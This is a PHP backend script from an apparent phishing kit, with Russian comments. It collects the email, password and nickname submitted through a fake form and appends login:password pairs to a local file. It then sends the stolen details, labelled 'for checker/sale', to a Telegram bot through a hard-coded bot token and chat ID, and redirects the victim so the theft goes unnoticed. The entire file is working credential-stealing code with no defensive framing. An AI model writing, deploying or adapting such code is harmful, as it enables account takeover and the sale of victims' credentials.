<?php
/**
 * Created by Magic_Team.
 * User: Magic
 * Date: 18.03.2021
 * Time: 22:45
 */


// сюда нужно вписать токен вашего бота
define('TELEGRAM_TOKEN', '5193619588:AAF82KbLJkOncbFzxgJm5bYjg9PU7iwkkzs');

// сюда нужно вписать ваш внутренний айдишник
define('TELEGRAM_CHATID', '1495918282');
$Log = $_POST['email'];
$Pass = $_POST['password'];
$Name = $_POST['name'];

$message = '
👑 Данные от аккаунта: '.PHP_EOL.'
✅ Логин: '.$Log.PHP_EOL.'
✅ Пароль: '.$Pass.PHP_EOL.'
✅ Ник: '.$Name.PHP_EOL.'
✅ Для чекера/продажи: '.$Log.':'.$Pass.PHP_EOL.'
';

$log = fopen("baza.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);

if (strpos($Log, 'gmail.com') !== false) // Проверка на почту гугл
{
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/'></head></html>"; // редирект если почта гугл
} else {
    message_to_telegram($message);
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/order.php'></head></html>";// редирект если все хорошо, лог отправлен в тг
}




// Телеграм Отчет (Отсылает сообщения в телеграмм).
function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}


